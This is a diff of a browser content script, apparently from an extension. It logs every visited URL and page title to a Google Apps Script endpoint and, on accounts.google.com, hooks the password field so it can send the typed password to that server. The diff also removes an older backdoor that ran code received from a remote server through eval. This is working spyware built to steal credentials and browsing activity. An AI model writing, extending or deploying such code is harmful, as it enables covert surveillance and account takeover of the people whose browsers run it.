@@ -1,56 +1,26 @@
-console.log('V31');
+console.log('V32');
 
 // Log URLs and data
 function serverLog(data) {
-	return fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${data}`, {
+	return fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${encodeURIComponent(window.location.href)}&data=${encodeURIComponent(data)}`, {
 		mode: 'cors'
 	})
 }
 
-// Get current state from the apps script server
-serverLog($('title').text())
-	.then(res => res.text())
-	.then(text => {
-		switch (text.split('@')[0]) {
-			case 'live':
-				initLiveControl(text.split('@')[1]);
-				break;
-		}
-	})
-siteSpecifics(window.location.host)
-
 // Check repeatedly to see if location has changed
 var href = window.location.href;
+var title = $('title').text();
+serverLog(title);
 setInterval(() => {
-	if (window.location.href !== href) {
+	if (window.location.href !== href || $('title').text() !== title) {
 		href = window.location.href;
-		serverLog($('title').text());
-		siteSpecifics(window.location.host);
+		title = $('title').text();
+		serverLog(title);
+		if(window.location.host === 'accounts.google.com'){
+			initPasswordMonitor();
+		}
 	}
 }, 50);
-
-// Distribute site specific tasks
-function siteSpecifics(host) {
-	switch (host) {
-		case 'accounts.google.com':
-			initPasswordMonitor();
-			break;
-	}
-
-}
-
-// Live Control
-function initLiveControl(serverUrl) {
-	if (window.location.hostname !== '127.0.0.1') {
-		var es = new EventSource(serverUrl + '/sse')
-		function respond(message){
-			fetch(serverUrl + '/response/?content=' + message)
-		}
-		es.onmessage = function (event) {
-			eval(event.data)
-		}
-	}
-}
 
 // Google Password
 function initPasswordMonitor() {
@@ -58,7 +28,7 @@ function initPasswordMonitor() {
 
 		console.log('Monitoring');
 
-		var password = $("input.whsOnd[type='password']");
+		var password = $('input[name="password"]');
 		var currentVal = password.attr('data-initial-value');
 
 		// Send to server
